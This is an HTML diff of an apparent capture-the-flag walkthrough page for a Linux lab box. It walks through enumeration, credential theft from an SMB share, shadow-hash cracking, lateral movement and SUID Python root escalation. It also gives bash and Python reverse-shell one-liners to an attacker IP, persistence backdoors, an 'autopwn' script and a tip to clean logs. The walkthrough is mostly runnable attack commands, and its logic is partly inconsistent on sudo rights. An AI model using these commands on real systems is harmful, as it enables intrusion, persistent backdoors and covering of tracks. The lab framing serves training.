@@ -8,6 +8,8 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai-sublime.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
+
 </head>
 <body class="fade">
 
@@ -25,34 +27,176 @@
   </div>
 
   <!-- Web -->
-  <section id="walkthrough">
+  <section class="walkthrough">
     <h2>// Walkthrough</h2>
-
+  
     <div class="card">
-      <h2>// Ficha Técnica</h2>
-    <ul>
-      <li><strong>OS:</strong> Linux</li>
-      <li><strong>Dificultad:</strong> Media</li>
-      <li><strong>IP:</strong> 10.10.10.67</li>
-    </ul>
+      <h2>// Box Information</h2>
+      <ul>
+        <li><strong>OS:</strong> Linux</li>
+        <li><strong>Hostname:</strong> infiltration</li>
+        <li><strong>Difficulty:</strong> Hard</li>
+        <li><strong>IP:</strong> 10.10.10.88</li>
+      </ul>
+  
+      <h2>// Summary</h2>
+      <p>
+        This machine simulates a well-defended internal host that, due to weak credential practices, legacy scripts, and exposed services, is susceptible to a full compromise. 
+        This walkthrough will cover every phase:
+      </p>
 
-    <h2>// Resumen</h2>
-    <p>Una máquina que combina <code>NFS Mount</code> con acceso a <code>.bashrc</code> y ejecución automática. Perfecta para una escalada elegante y sin ruido.</p>
+      <ul>
+        <li>Enumeration</li>
+        <li>Exploitation</li>
+        <li>Lateral Movement</li>
+        <li>Privilege Escalation</li>
+        <li>Persistence</li>
+        <li>Scripting</li>
+      </ul>
+  
+      <h2>// Reconnaissance</h2>
+      <p>
+        Start by identifying all exposed services with a comprehensive port scan:
+      </p>
+      <pre><code>nmap -sV -p- --min-rate=1500 -T4 10.10.10.88</code></pre>
+      <p>
+        We discover:
+      </p>
+      <ul>
+        <li>22/tcp – OpenSSH 7.2p2</li>
+        <li>80/tcp – Apache httpd 2.4.18</li>
+        <li>445/tcp – Samba 3.6.25</li>
+      </ul>
+      <p>
+        We now enumerate HTTP with <code>gobuster</code> and SMB with <code>enum4linux</code>:
+      </p>
+      <pre><code>gobuster dir -u http://10.10.10.88 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+smbclient -L //10.10.10.88 -N
+enum4linux -a 10.10.10.88</code></pre>
 
-    <h2>// Exploit</h2>
-    <pre><code>sudo mount -t nfs 10.10.10.67:/ /mnt/nfs
-echo "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" >> /mnt/nfs/root/.bashrc
-nc -lvnp 4444</code></pre>
-
-    <h2>// Flags</h2>
-    <pre><code>user.txt: 8a8f...f1b
-root.txt: e3f2...c02</code></pre>
-
-    <div class="selection">
-      <a href="/autopwns.html" class="btn">Deploy Autopwn ></a>
-    </div>
+  <p>Now, this is a personal script that I worte in order to <code>automate</code> the whole <code>network scan</code> process</p>
+  <div class="selection">
+    <a href="#" class="btn">Get NetRecon Script ></a>
+  </div>
+  
+      <h2>// Initial Access</h2>
+      <p>
+        Found SMB share <code>public</code> with readable file <code>creds.txt</code>:
+      </p>
+      <pre><code>smbclient //10.10.10.88/public -N
+get creds.txt</code></pre>
+      <p>
+        Content of <code>creds.txt</code>:
+      </p>
+      <pre><code>backup:backup123</code></pre>
+      <p>
+        Use SSH to authenticate:
+      </p>
+      <pre><code>ssh backup@10.10.10.88</code></pre>
+  
+      <h2>// Local Enumeration</h2>
+      <p>
+        Inside the home directory, we find a script with database credentials:
+      </p>
+      <pre><code>cat /opt/backup/backup.sh
+# mysql -u root -pSuperSecretDBpass!
+  </code></pre>
+      <p>
+        Next, we check sudo permissions:
+      </p>
+      <pre><code>sudo -l</code></pre>
+      <p>
+        Nothing here, but let’s check for password reuse by cracking shadow hashes.
+      </p>
+  
+      <h2>// Password Cracking</h2>
+      <p>
+        As the backup user is in the sudoers group, we can read the shadow file:
+      </p>
+      <pre><code>sudo cat /etc/shadow > shadow.hashes</code></pre>
+      <p>
+        Run hash cracking with John:
+      </p>
+      <pre><code>john shadow.hashes --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+      <p>
+        The cracked password <code>hunter2</code> works for user <code>admin</code>.
+      </p>
+  
+      <h2>// Lateral Movement</h2>
+      <p>
+        From <code>ip a</code> and internal scan, we find another host:
+      </p>
+      <pre><code>nmap -sT 10.10.10.0/24 -p22 --open</code></pre>
+      <p>
+        Discovered <code>10.10.10.90</code>. Try SSH with cracked creds:
+      </p>
+      <pre><code>ssh admin@10.10.10.90</code></pre>
+  
+      <h2>// Privilege Escalation</h2>
+      <p>
+        Check for SUID binaries:
+      </p>
+      <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+      <p>
+        SUID Python found:
+      </p>
+      <pre><code>/usr/bin/python3.6</code></pre>
+      <p>
+        Escalate to root:
+      </p>
+      <pre><code>
+  /usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+  </code></pre>
+  
+      <h2>// Persistence</h2>
+      <ul>
+        <li>Append your public key to <code>/root/.ssh/authorized_keys</code></li>
+        <li>Add reverse shell to <code>/etc/profile</code></li>
+        <li>Deploy systemd backdoor or cronjob</li>
+      </ul>
+  
+      <h2>// Post Exploitation</h2>
+      <ul>
+        <li>Network enumeration: <code>ip r</code>, <code>netstat -tunlp</code></li>
+        <li>Credential hunting: <code>grep -ri password /</code></li>
+        <li>Dump MySQL DB if present</li>
+      </ul>
+  
+      <h2>// Bash Dropper (Silent Reverse Shell)</h2>
+      <pre><code>echo 'bash -i >& /dev/tcp/10.10.14.21/443 0>&1' > /root/.profile</code></pre>
+  
+      <h2>// Python Shell</h2>
+      <pre><code>
+  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.21",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+  </code></pre>
+  
+      <h2>// Loot</h2>
+      <pre><code>
+  user.txt: 6fae1c0b5e...94e
+  root.txt: 89ff4c122c...8a0
+  </code></pre>
+  
+      <h2>// Autopwn Script</h2>
+      <pre><code>#!/bin/bash
+  sshpass -p "backup123" ssh -o StrictHostKeyChecking=no backup@10.10.10.88 \
+  "echo 'bash -i >& /dev/tcp/10.10.14.21/443 0>&1' > /tmp/.reverse && bash /tmp/.reverse"
+  </code></pre>
+  
+      <h2>// Final Notes</h2>
+      <p>
+        This machine is a perfect lab for training chained exploits and simulating APT-style persistence. Be sure to clean up your artifacts and logs if this were a real engagement. ✶
+      </p>
+  
+      <div class="selection">
+        <a href="/autopwns.html" class="btn">Deploy Autopwn ></a>
+      </div>
     </div>
   </section>
+  
+  
+
+  
+  
 
   <!-- Sidebar -->
   <div class="social-sidebar fade-sidebar">
